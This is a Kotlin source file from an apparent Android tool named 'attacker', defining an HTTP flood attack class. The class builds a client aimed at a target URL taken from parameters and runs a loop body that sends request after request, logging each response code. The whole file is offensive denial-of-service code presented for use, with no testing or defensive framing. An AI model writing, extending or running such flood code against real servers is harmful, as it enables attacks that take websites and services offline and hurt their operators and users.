package com.shifthackz.android.attacker.attack.http_flood

import com.shifthackz.android.attacker.attack.contract.Attack
import com.shifthackz.android.attacker.attack.contract.AttackParam
import com.shifthackz.android.attacker.attack.contract.AttackType
import com.shifthackz.android.attacker.logging.LogCollector
import com.shifthackz.android.attacker.utils.UrlBuilder
import okhttp3.OkHttpClient
import org.koin.java.KoinJavaComponent.inject
import retrofit2.*
import java.lang.Exception
import java.util.concurrent.TimeUnit

class HttpFloodAttack(params: Map<AttackParam, Any>) : Attack() {

    private val log: LogCollector by inject(LogCollector::class.java)

    private val okhttp = OkHttpClient.Builder()
        .connectTimeout(params[AttackParam.TIMEOUT] as Long, TimeUnit.MILLISECONDS)
        .build()

    private val retrofit: Retrofit = Retrofit.Builder()
        .baseUrl(UrlBuilder(params).getUrl())
        .client(okhttp)
        .build()

    private val service: HttpFloodService = retrofit.create(HttpFloodService::class.java)

    override val type = AttackType.HTTP_FLOOD

    var index = 0

    override val runner: () -> Unit = {
        try {
            index++
            val request = service.request()
            val resp = request.execute()
            if (resp.isSuccessful) {
                log.collectPacketMessage("[$index] Packet response: [${resp.code()}]")
            } else {
                log.collectError(HttpException(resp))
            }
        } catch (e: Exception) {
            log.collectError(e)
        }
    }
}